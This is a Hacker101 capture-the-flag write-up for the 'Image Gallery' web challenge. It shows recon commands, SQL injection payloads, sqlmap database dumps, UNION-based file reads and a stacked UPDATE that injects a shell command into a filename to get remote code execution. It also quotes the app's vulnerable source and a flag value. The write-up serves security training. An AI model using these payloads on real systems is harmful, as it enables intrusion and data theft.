## Image Gallery - Hacker101 CTF - Web (moderate)

#### Initial recon

The initial page is pretty bareboned, just some pictures of kittens and one "invisible" picture - interesting.

![homepage](https://github.com/user-attachments/assets/8bf9da00-bfcd-443d-a302-42c280a06d6e)



No input areas or interactive buttons, so I will first enumerate the subdomains.

Running the following gobuster command yields one result for a subdirectory "fetch", also checking burpsuite proxy, the fetch subdomain is requested with an id parameter when loading the page.

```
gobuster dir -u https://e9170b12f5c308a2c17f79640062f84a.ctf.hacker101.com/ -w common.txt
```

#### Exploring /fetch subdirectory and id parameter

burpsuite also tells us that the id requests were sent for 1,2,3. When the id parameter is set to 1 and 2 the page responds with non-human readable data, for id = 3, we get an internal server error. We could be looking at an IDOR vulnerability or Insecure direct object reference.

The fetch subdirectory with id parameter is likely how the application retrieves the images for the magical image gallery. 

I spin up burpsuite turbo intruder to test the ID parameter for any accessible content. I make a quick bash script to produce a number list to use for turbo intruder:

```                                        
#!/bin/bash

touch numbers.txt

for i in {0..9999}; do
  echo $i >> numbers.txt
done
```

This yielded no results, so we can rule out simple IDOR vulnerabilities for now.

I run ffuf to fuzz the id parameter with non-numeric payloads as well:

```
─$ ffuf -u https://ade791f008ebf6f1b0db57874634e47f.ctf.hacker101.com/fetch?id=FUZZ -X GET -w common.txt -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://ade791f008ebf6f1b0db57874634e47f.ctf.hacker101.com/fetch?id=FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

02                      [Status: 200, Size: 98716, Words: 425, Lines: 419, Duration: 283ms]
1                       [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 263ms]
01                      [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 358ms]
2                       [Status: 200, Size: 98716, Words: 425, Lines: 419, Duration: 354ms]
id                      [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 182ms]
true                    [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 124ms]
:: Progress: [4614/4614] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:26] :: Errors: 0 ::

```

The "true" result tells me that this input isn't properly sanitized as many programming languages equate true to 1. Also, when I enter 00000000001 for id or any amount of leading 0s the response is the same as id=1.

I test SQLi with a payload id=1;
If this yields the same response as id=1 SQLi will be explored more.

After sending hte request through burpsuite, the response is the same.

#### SQLi for /fetch?id parameter

Boolean based injection test - I send id=1 AND 1=1 --- expected response is the same as id=1 and this is confirmed. Next I try id=1 AND 1=2 --- expected response is a 404,500 and this is confirmed. SQLi vulnerability is confirmed.

Once confirmed, I use sqlmap to get database type, names, tables, columns, and values.

Inital run:

```
sqlmap -u "https://ade791f008ebf6f1b0db57874634e47f.ctf.hacker101.com/fetch?id=1" --dbs --level=5 --risk=3 --batch --threads=10
```

This command enumerates the database names:

```
available databases [4]:
[*] information_schema
[*] level5
[*] mysql
[*] performance_schema
```

level5 is interesting so I continue to get tables, columns, and values.

```
sqlmap -u "https://ade791f008ebf6f1b0db57874634e47f.ctf.hacker101.com/fetch?id=1" --dbms=mysql -D level5 --dump --level=5 --risk=3 --batch --threads=10
```

The results of this command tell me there are two tables in the "level5" database: "albums" and "photos".

Results:

```
Database: level5
Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | 4a1b37876b85e982c4494e97120cef03a342b876d9f0414d26b711432bb531cf |
+----+------------------+--------+------------------------------------------------------------------+

Database: level5
Table: albums
[1 entry]
+----+---------+
| id | title   |
+----+---------+
| 1  | Kittens |
+----+---------+
```

With knowledge of the column names, I can make an SQL payload that will get the image based on the title of the file. To test I first use the payload:

```
id=0 OR title="Purrfect";  #make sure to URL encode
```

If this returns the same response as id=2, then my payload methodology is proved. After sending the request, I receive the same response as if I requested id=2.

Now to find out what "invisible" is hiding:

```
id=0 OR title="Invisible";
```

Hmm, that didn't work. It likely has to be due to the fact that whatever is meant for the "invisible" placeholder has no corresponding file location. The other images have the "file/" location whereas the "Invisible" value does not and instead gives us a hash.

#### Web application enumeration with SQLi

The fetch?id works by selecting the filename from the photos table that has a given id. This filename is then passed to the fetch function and returns the associated file or in this case cat picture.

When I enter the below for the id value, I am able to retrieve same result for id=1. This validates how the fetch function works server side:

```
0 UNION SELECT "files/adorable.jpg";
```

With the above payload, I should be able to view files located on the web app. Next steps are to enumerate the web application configurations.

I will use the above payload combined with a wordlist of common web app files to see what I can find.

Dockerfile:

```
FROM tiangolo/uwsgi-nginx-flask:python2.7

WORKDIR /app

RUN apt-get update
RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential

ADD requirements.txt /app/

RUN pip install --trusted-host pypi.python.org -r requirements.txt

ADD . /app
```

Requirements.txt:

```
Flask
mysqlclient
pycrypto
```

With these files found, I continue to try likely files in the app/ directory, main.py returns the backbone for the website and one of the flags!

main.py:

```
from flask import Flask, abort, redirect, request, Response
import base64, json, MySQLdb, os, re, subprocess

app = Flask(__name__)

home = '''
<!doctype html>
<html>
	<head>
		<title>Magical Image Gallery</title>
	</head>
	<body>
		<h1>Magical Image Gallery</h1>
$ALBUMS$
	</body>
</html>
'''

viewAlbum = '''
<!doctype html>
<html>
	<head>
		<title>$TITLE$ -- Magical Image Gallery</title>
	</head>
	<body>
		<h1>$TITLE$</h1>
$GALLERY$
	</body>
</html>
'''

def getDb():
	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")

def sanitize(data):
	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())

	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'

	return home.replace('$ALBUMS$', rep)

@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)
	# It's dangerous to go alone, take this:
	# ^FLAG^55b0d0b55a99c5537ce92b24246ccf2fecf5d253e252447ee7b135414a6dd64d$FLAG$

	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()

if __name__ == "__main__":
	app.run(host='0.0.0.0', port=80)

```

#### Finding futher attack vectors from main.py file

After looking at the main.py file in depth, the line in the @app.route('/') method that calculates the "Space used:" calls a subprocess that has the potential for RCE:

```
rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
```

This line checks the file name and gets the size for the file, but if the filename is modified to something like "files/adorable.jpg; <MALICIOUS COMMAND>" our command should be run.

Making use of the SQLi, I test to see if I can update the existing entries in the photos table:

```
2; UPDATE photos SET filename="files/adorable.jpg; ls" WHERE id=1; COMMIT;
```

If this injection works, the title for the first photo should be changed to "ttt" and the "space used" portion of the page will hopefully display the output of the ls command:

![update](https://github.com/user-attachments/assets/c31d0c86-c39d-4217-9cb1-196d858d2a4a)



Perfect, we have RCE!

After hours of searching the system for the flags, I have no luck. With the clue "Be aware of your environment" from hacker101, I check the environment variables with the following command:

```
printenv | grep -i flag
```

This returns all three flags for the CTF!

![flags](https://github.com/user-attachments/assets/978fbec5-bc49-4dbb-b635-c7ba047f8066)


#### Resources

https://portswigger.net/web-security/access-control/idor
https://github.com/emadshanab/WordLists-20111129/blob/master/Filenames_or_Directories_All.wordlist
https://github.com/danielmiessler/SecLists/tree/master
